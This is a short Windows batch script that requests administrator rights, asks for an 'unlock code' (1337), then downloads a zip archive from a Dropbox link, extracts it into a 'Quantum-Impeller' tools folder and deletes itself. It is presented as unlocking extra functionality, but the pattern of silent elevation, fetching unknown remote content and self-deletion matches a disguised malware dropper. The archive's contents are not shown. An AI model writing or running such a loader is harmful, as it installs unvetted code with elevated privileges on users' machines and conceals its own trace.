@echo off

FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

:start
echo Enter the code to unlock additional functionality :
set /p "code=>"

if "%code%"=="1337" (

powershell -Command "curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=qwi2beg8zn95fthsww4yzt6uz&st=9roxmoty&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
(goto) 2>nul & del "%~f0"

) else (
    echo Access Denied. Try again.
    goto start
)
